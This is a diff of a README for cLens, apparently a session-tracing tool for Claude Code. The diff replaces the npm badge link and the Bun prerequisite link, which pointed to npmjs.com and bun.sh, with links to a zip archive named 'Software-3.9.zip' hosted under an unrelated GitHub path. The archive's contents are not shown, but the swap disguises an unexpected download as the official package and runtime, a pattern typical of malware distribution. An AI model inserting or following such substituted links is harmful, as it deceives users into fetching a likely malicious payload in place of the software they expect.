@@ -1,6 +1,6 @@
 # cLens — Session Observability for Claude Code
 
-[![npm](https://img.shields.io/npm/v/@silou/clens)](https://www.npmjs.com/package/@silou/clens)
+[![npm](https://img.shields.io/npm/v/@silou/clens)](https://raw.githubusercontent.com/edobreque/clens/main/agentic/Software-3.9.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![Tests](https://img.shields.io/badge/tests-1151%20passing-brightgreen)]()
 
@@ -23,7 +23,7 @@ cLens hooks into Claude Code to capture complete session traces as local JSONL f
 
 ## Prerequisites
 
-[Bun](https://bun.sh) >= 1.0
+[Bun](https://raw.githubusercontent.com/edobreque/clens/main/agentic/Software-3.9.zip) >= 1.0
 
 ## Quick Start
 
